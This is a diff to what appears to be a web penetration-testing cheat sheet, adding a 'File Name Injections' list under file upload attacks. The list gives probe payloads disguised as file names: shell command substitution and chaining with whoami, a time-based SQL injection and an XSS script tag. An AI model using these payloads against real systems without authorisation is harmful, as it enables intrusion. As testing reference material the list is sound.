@@ -881,6 +881,16 @@ XXE/SSRF = XML, SVG, PDF, PPT, DOC
 DoS = ZIP, JPG, PNG
 ```
 
+- File Name Injections
+
+```
+file$(whoami).jpg
+file`whoami`.jpg
+file.jpg||whoami
+file';select+sleep(5);--.jpg
+file<script>alert(window.origin);</script>.jpg
+```
+
 #13. - Sensitive Data Exposure
 -----------------------------------------
 
